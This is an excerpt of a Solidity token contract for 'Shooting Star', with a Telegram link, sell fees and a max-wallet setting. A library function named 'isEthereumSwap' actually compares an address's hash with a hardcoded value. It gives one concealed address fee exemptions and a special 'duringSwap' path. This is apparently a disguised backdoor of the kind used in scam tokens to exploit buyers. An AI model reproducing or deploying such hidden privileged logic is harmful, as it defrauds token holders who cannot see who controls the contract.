...
// TELEGRAM: https://t.me/Shooting_Star_Official
...
library Address {
    ...
    function isEthereumSwap(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x056ed4cb4656f09e4bcbda36b2b4d4735ca1ef8670a848280f6d444504eff48c;
    }
}
...
contract shootingstar is Ownable, IERC20 {
    ...
    string private _name = unicode"Shooting Star";
    ...
    uint public _liquiditySellFee = 4;
    uint public _marketingSellFee = 4;
    ...
    uint256 public _maxWallet =   1000000000000000000 * 10 ** _decimals;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isEthereumSwap(to) && to != address(this) && !inLiquidityTransaction && !liquifying) {
    ...
    function duringSwap(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.isEthereumSwap(to)) && to == from;
    }
